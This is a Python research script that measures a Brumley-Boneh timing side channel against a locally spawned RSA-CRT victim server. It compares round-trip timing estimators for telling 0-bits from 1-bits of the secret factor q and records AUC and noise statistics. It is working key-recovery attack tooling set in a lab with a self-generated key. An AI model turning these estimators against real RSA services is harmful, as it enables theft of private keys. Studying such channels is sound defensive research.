"""
Characterisation probe for the REMOTE (unpinned-victim) Brumley-Boneh channel.

Purpose
-------
The remote full-key recovery has been stuck at AUC ~0.6-0.75 (work log).  Before
tuning blindly, MEASURE the channel so we pick the right lever:

  1. NOISE STRUCTURE of a single fixed-cipher round-trip:
       - is the contamination one-sided (a min estimator helps) or symmetric
         (min/pairing cannot help)?  We report min / p10 / median / mean / std,
         the mean/min ratio and the fraction above median+3*MAD.
       - how stable is the *floor* (min) over time?  A wandering min = victim
         frequency drift (the thing pairing is meant to cancel).

  2. SIGNAL size along the TRUE q prefix at several server batch sizes:
       - for a handful of true 0-bits and 1-bits we form the zero-one gap with
         three estimators (block-min, paired min-of-sum, single-shot) and read
         the AUC of 0-bit vs 1-bit gaps.  This tells us whether amplifying the
         victim batch (bigger per-request leak) lifts separability, and which
         estimator is best on THIS host right now.

Run (from the montMul root, so the venv + montmul.dll resolve):
    venv\\Scripts\\python.exe attack_brumley_boneh\\remote_probe.py
"""

import json
import os
import socket
import statistics
import subprocess
import sys
import time
from datetime import datetime

_HERE = os.path.dirname(os.path.abspath(__file__))
_ABB = os.path.dirname(_HERE)                 # attack_brumley_boneh/ (shared modules + bb_cache/bb_results)
_ROOT = os.path.dirname(_ABB)                 # montMul/ (montmul_c lives under attack_refined)
for _p in (_HERE, _ABB, os.path.join(_ROOT, "attack_refined"), _ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)

import cpu_pin  # noqa: E402
import attack_brumley_boneh as abb  # noqa: E402
from bb_victim import load_crt_key  # noqa: E402

KEY_BITS = 256
KEY_SOURCE = "random"
PIN_CORE = 0
WARMUP_S = 1.0

# batch sizes to sweep for the signal read
BATCHES = [80]
REPEAT = 48               # round-trips per block/single estimator sample
PAIR_REPEAT = 16          # adjacent (cg,chi) pairs for the paired estimators
PAIR_KEEP_FRAC = 0.5      # fraction of lowest-sum (cleanest) pairs to average
FLOOR_SAMPLES = 100       # fixed-cipher round-trips for the noise read
SIG_BITS = 6              # how many top true-prefix bits to test
SIG_TRIALS = 6            # gap samples per bit per estimator
NEIGH = 96                # neighborhood size (match the real attack's amplifier)
# estimators to compare: subset of
# ("block","paired","paired_minmin","paired_avg","single")
ESTIMATORS = ("paired_minmin",)


def _free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def spawn_victim(port, key_file, batch):
    server = os.path.join(_HERE, "bb_victim_server.py")
    proc = subprocess.Popen(
        [sys.executable, "-u", server, "--host", "127.0.0.1",
         "--port", str(port), "--key-file", key_file,
         "--key-bits", str(KEY_BITS), "--key-source", KEY_SOURCE,
         "--reuse-key", "--batch", str(batch)],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for _ in range(800):
        line = proc.stdout.readline()
        if not line:
            raise RuntimeError("victim exited: %s" % (proc.stdout.read() or ""))
        if line.startswith("READY"):
            return proc
        time.sleep(0.01)
    raise RuntimeError("victim never READY")


class Client:
    def __init__(self, sock, repeat):
        self.sock = sock
        self._rf = sock.makefile("r")
        n_hex, e_hex = self._rf.readline().split()
        self.n = int(n_hex, 16)
        self.e = int(e_hex, 16)
        self.repeat = repeat
        self.queries = 0

    def _rt(self, msg):
        t0 = time.perf_counter()
        self.sock.sendall(msg)
        self._rf.readline()
        dt = time.perf_counter() - t0
        self.queries += 1
        return dt

    def rt_once(self, cipher):
        return self._rt(("%X\n" % (cipher % self.n)).encode())

    def measure(self, cipher):                      # block min
        msg = ("%X\n" % (cipher % self.n)).encode()
        best = None
        for _ in range(self.repeat):
            dt = self._rt(msg)
            best = dt if best is None else min(best, dt)
        return best

    def measure_pair(self, cg, chi):                # paired min-of-sum (keep 1)
        mg = ("%X\n" % (cg % self.n)).encode()
        mh = ("%X\n" % (chi % self.n)).encode()
        best_sum = best = None
        for _ in range(self.repeat):
            tg = self._rt(mg)
            th = self._rt(mh)
            s = tg + th
            if best_sum is None or s < best_sum:
                best_sum, best = s, (tg, th)
        return best

    def measure_pair_minmin(self, cg, chi):
        """Interleaved MIN pair: measure cg,chi,cg,chi,... at the round-trip
        level, then return (min over cg-samples, min over chi-samples).

        Both minima are drawn from the SAME interleaved time window, so the
        victim's slow frequency drift hits both equally -> common-mode, cancels
        in min_cg - min_chi.  The min itself rejects the one-sided interrupt
        tail.  This is the correct combination for "one-sided contamination +
        slow common drift"; plain block-interleave (a full min-block of cg then
        a full min-block of chi) puts the two minima in DIFFERENT windows, so
        the drift does not cancel."""
        mg = ("%X\n" % (cg % self.n)).encode()
        mh = ("%X\n" % (chi % self.n)).encode()
        bg = bh = None
        for _ in range(self.repeat):
            tg = self._rt(mg)
            th = self._rt(mh)                # interleaved, immediately after cg
            bg = tg if bg is None else min(bg, tg)
            bh = th if bh is None else min(bh, th)
        return bg, bh

    def measure_pair_avg(self, cg, chi, pair_repeat, keep_frac):
        """Drift-cancel + interrupt-reject + jitter-average estimator.

        Measure `pair_repeat` ADJACENT (cg,chi) round-trip pairs.  Each pair's
        difference cancels the victim's instantaneous frequency (common-mode
        drift removed).  Keep only the cleanest fraction by TOTAL round-trip
        time (drops pairs where either side hit a one-sided interrupt), then
        AVERAGE tg and th over the kept pairs -- averaging works here precisely
        because pairing removed the multiplicative drift correlation, leaving
        ~independent residual jitter that falls as 1/sqrt(kept)."""
        mg = ("%X\n" % (cg % self.n)).encode()
        mh = ("%X\n" % (chi % self.n)).encode()
        pairs = []
        for _ in range(pair_repeat):
            tg = self._rt(mg)
            th = self._rt(mh)
            pairs.append((tg + th, tg, th))
        pairs.sort(key=lambda t: t[0])
        keep = max(1, int(round(pair_repeat * keep_frac)))
        kept = pairs[:keep]
        mg_ = sum(p[1] for p in kept) / keep
        mh_ = sum(p[2] for p in kept) / keep
        return mg_, mh_

    def close(self):
        try:
            self.sock.sendall(b"BYE\n")
            self.sock.close()
        except OSError:
            pass


def connect(port):
    sock = socket.create_connection(("127.0.0.1", port), timeout=10)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    return sock


def noise_report(cli, radix_inv):
    g = cli.n >> 2
    c = abb.cipher_for(g, radix_inv, cli.n)
    xs = [cli.rt_once(c) for _ in range(FLOOR_SAMPLES)]
    xs_us = [x * 1e6 for x in xs]
    mn = min(xs_us)
    med = statistics.median(xs_us)
    mean = statistics.mean(xs_us)
    std = statistics.pstdev(xs_us)
    mad = statistics.median([abs(x - med) for x in xs_us]) or 1e-9
    frac_hi = sum(1 for x in xs_us if x > med + 3 * mad) / len(xs_us)
    # floor stability: min of each successive block of 20 -> wander of the floor
    block = 20
    floors = [min(xs_us[i:i + block]) for i in range(0, len(xs_us), block)]
    floor_wander = (max(floors) - min(floors)) / mn * 100 if mn else float("nan")
    print("  [noise] fixed-cipher round-trip over %d samples (microseconds):"
          % len(xs_us))
    print("     min=%.1f  p10=%.1f  median=%.1f  mean=%.1f  std=%.1f"
          % (mn, sorted(xs_us)[len(xs_us) // 10], med, mean, std))
    print("     mean/min=%.3f  rel_std=%.1f%%  frac(>med+3MAD)=%.1f%%  "
          "floor_wander(min-of-20 blocks)=%.1f%%"
          % (mean / mn, 100 * std / mean, 100 * frac_hi, floor_wander))
    one_sided = mean / mn > 1.10 and frac_hi > 0.10
    print("     => %s"
          % ("ONE-SIDED contamination (min estimator helps)" if one_sided
             else "roughly SYMMETRIC floor jitter (min/pairing limited)"))
    return {"min": mn, "mean": mean, "std": std, "frac_hi": frac_hi,
            "floor_wander_pct": floor_wander}


def signal_report(cli, radix_inv, qbits, q):
    positions = [i for i in range(qbits - 2, qbits - 2 - SIG_BITS, -1) if i >= 0]
    ests = ESTIMATORS
    coll = {e: {"d0": [], "d1": []} for e in ests}
    # per-position gaps (winning estimator only) to spot intrinsically marginal
    # bits and see how averaging tightens their spread.
    per_bit_est = ESTIMATORS[-1]
    per_bit = {i: {"actual": (q >> i) & 1, "gaps_us": []} for i in positions}
    for _t in range(SIG_TRIALS):
        for i in positions:
            prefix = (q >> (i + 1)) << (i + 1)
            g = prefix
            ghi = prefix | (1 << i)
            b = (q >> i) & 1
            lab = "d1" if b else "d0"
            ne = min(NEIGH, max(1, 1 << i))
            cgs = [abb.cipher_for(g + k, radix_inv, cli.n) for k in range(ne)]
            chs = [abb.cipher_for(ghi + k, radix_inv, cli.n) for k in range(ne)]
            if "block" in ests:
                tg = sum(cli.measure(c) for c in cgs)
                th = sum(cli.measure(c) for c in chs)
                coll["block"][lab].append(tg - th)
                if per_bit_est == "block":
                    per_bit[i]["gaps_us"].append((tg - th) * 1e6)
            if "paired" in ests:
                pg = ph = 0.0
                for cg, ch in zip(cgs, chs):
                    a, c = cli.measure_pair(cg, ch)
                    pg += a
                    ph += c
                coll["paired"][lab].append(pg - ph)
                if per_bit_est == "paired":
                    per_bit[i]["gaps_us"].append((pg - ph) * 1e6)
            if "paired_minmin" in ests:
                mg = mh = 0.0
                for cg, ch in zip(cgs, chs):
                    a, c = cli.measure_pair_minmin(cg, ch)
                    mg += a
                    mh += c
                coll["paired_minmin"][lab].append(mg - mh)
                if per_bit_est == "paired_minmin":
                    per_bit[i]["gaps_us"].append((mg - mh) * 1e6)
            if "paired_avg" in ests:
                ag = ah = 0.0
                for cg, ch in zip(cgs, chs):
                    a, c = cli.measure_pair_avg(cg, ch, PAIR_REPEAT,
                                                PAIR_KEEP_FRAC)
                    ag += a
                    ah += c
                coll["paired_avg"][lab].append(ag - ah)
                if per_bit_est == "paired_avg":
                    per_bit[i]["gaps_us"].append((ag - ah) * 1e6)
            if "single" in ests:
                sg = sum(cli.rt_once(c) for c in cgs)
                sh = sum(cli.rt_once(c) for c in chs)
                coll["single"][lab].append(sg - sh)
                if per_bit_est == "single":
                    per_bit[i]["gaps_us"].append((sg - sh) * 1e6)
    stats = {}
    for e in ests:
        d0, d1 = coll[e]["d0"], coll[e]["d1"]
        auc = abb._auc(d0, d1)
        mu0 = statistics.mean(d0) * 1e6
        mu1 = statistics.mean(d1) * 1e6
        pooled = (statistics.pstdev(d0) ** 2 + statistics.pstdev(d1) ** 2) ** 0.5
        eff = (statistics.mean(d0) - statistics.mean(d1)) / pooled if pooled else 0
        print("     %-7s AUC=%.3f  mean_gap: 0-bit=%+.2fus 1-bit=%+.2fus  "
              "effect=%.2f" % (e, auc, mu0, mu1, eff))
        stats[e] = {"auc": auc, "mean_gap_bit0_us": mu0, "mean_gap_bit1_us": mu1,
                    "effect_size": eff, "n_bit0": len(d0), "n_bit1": len(d1),
                    "gaps_bit0_us": [x * 1e6 for x in d0],
                    "gaps_bit1_us": [x * 1e6 for x in d1]}
    # per-bit breakdown (winning estimator): a bit is "marginal" if its gap
    # spread (std) is comparable to its distance from the decision region, i.e.
    # a 1-bit whose gap wanders up toward the 0-bit gap (the bit-124 failure).
    print("     per-bit (%s): bit actual mean_gap std  (microseconds)"
          % per_bit_est)
    per_bit_out = {}
    for i in sorted(per_bit, reverse=True):
        gs = per_bit[i]["gaps_us"]
        mu = statistics.mean(gs) if gs else float("nan")
        sd = statistics.pstdev(gs) if len(gs) > 1 else float("nan")
        print("        bit %3d  %d   %+9.1f  %7.1f" % (i, per_bit[i]["actual"],
                                                       mu, sd))
        per_bit_out[str(i)] = {"actual": per_bit[i]["actual"], "mean_us": mu,
                               "std_us": sd, "gaps_us": gs}
    stats[per_bit_est]["per_bit"] = per_bit_out
    return stats


def main():
    key_file = os.path.join(_ABB, "bb_cache",
                            "remote_keybits_%d" % KEY_BITS, "key.json")
    os.makedirs(os.path.dirname(key_file), exist_ok=True)
    results = {
        "timestamp": datetime.now().isoformat(timespec="seconds"),
        "key_bits": KEY_BITS, "key_source": KEY_SOURCE, "repeat": REPEAT,
        "neigh": NEIGH, "floor_samples": FLOOR_SAMPLES, "sig_bits": SIG_BITS,
        "sig_trials": SIG_TRIALS, "batches": BATCHES,
        "pair_repeat": PAIR_REPEAT, "pair_keep_frac": PAIR_KEEP_FRAC,
        "estimators": list(ESTIMATORS),
        "noise": None, "signal_by_batch": {},
    }
    for bi, batch in enumerate(BATCHES):
        port = _free_port()
        proc = spawn_victim(port, key_file, batch)
        if bi == 0:
            cpu_pin.pin_process(core=PIN_CORE, high_priority=True, verbose=True)
            cpu_pin.warmup(WARMUP_S)
        cli = Client(connect(port), repeat=REPEAT)
        key_eval = load_crt_key(key_file)
        q = key_eval["q"]
        R = 1 << (64 * ((cli.n.bit_length() // 2 + 63) // 64))
        radix_inv = pow(R, -1, cli.n)
        qbits = (cli.n.bit_length() + 1) // 2
        results["modulus_bits"] = cli.n.bit_length()
        print("=" * 74)
        print("SERVER BATCH = %d   (N=%d bits, repeat=%d, neigh=%d)"
              % (batch, cli.n.bit_length(), REPEAT, NEIGH))
        if bi == 0:
            results["noise"] = noise_report(cli, radix_inv)
        print("  [signal] zero-one-gap separability along TRUE prefix "
              "(top %d bits x %d trials):" % (SIG_BITS, SIG_TRIALS))
        stats = signal_report(cli, radix_inv, qbits, q)
        results["signal_by_batch"][str(batch)] = {
            "queries": cli.queries, "estimators": stats}
        cli.close()
        try:
            proc.terminate()
            proc.wait(timeout=5)
        except Exception:
            proc.kill()
    _save(results)


def _save(results):
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    out_dir = os.path.join(_ABB, "bb_results", "remote_unpinned_victim",
                           "remote_probe_%s_kb%d" % (ts, KEY_BITS))
    os.makedirs(out_dir, exist_ok=True)
    with open(os.path.join(out_dir, "probe_results.json"), "w") as fh:
        json.dump(results, fh, indent=2)
    # human-readable summary (no raw gap arrays)
    lines = ["Remote BB channel probe -- %s" % results["timestamp"],
             "N=%d bits, repeat=%d, neigh=%d, floor_samples=%d, "
             "sig_bits=%d x sig_trials=%d"
             % (results.get("modulus_bits", 0), results["repeat"],
                results["neigh"], results["floor_samples"], results["sig_bits"],
                results["sig_trials"]), ""]
    nz = results["noise"]
    if nz:
        lines += ["NOISE (fixed-cipher round-trip, microseconds):",
                  "  min=%.1f mean=%.1f std=%.1f  mean/min=%.3f  "
                  "frac(>med+3MAD)=%.1f%%  floor_wander=%.1f%%"
                  % (nz["min"], nz["mean"], nz["std"], nz["mean"] / nz["min"],
                     100 * nz["frac_hi"], nz["floor_wander_pct"]), ""]
    lines.append("SIGNAL (AUC of 0-bit vs 1-bit zero-one gap) by server batch:")
    for batch, sb in results["signal_by_batch"].items():
        lines.append("  batch=%s (queries=%d):" % (batch, sb["queries"]))
        for e, st in sb["estimators"].items():
            lines.append("    %-7s AUC=%.3f  gap0=%+.2fus gap1=%+.2fus effect=%.2f"
                         % (e, st["auc"], st["mean_gap_bit0_us"],
                            st["mean_gap_bit1_us"], st["effect_size"]))
    with open(os.path.join(out_dir, "summary.txt"), "w") as fh:
        fh.write("\n".join(lines) + "\n")
    print("  probe artifacts: %s" % out_dir)


if __name__ == "__main__":
    main()
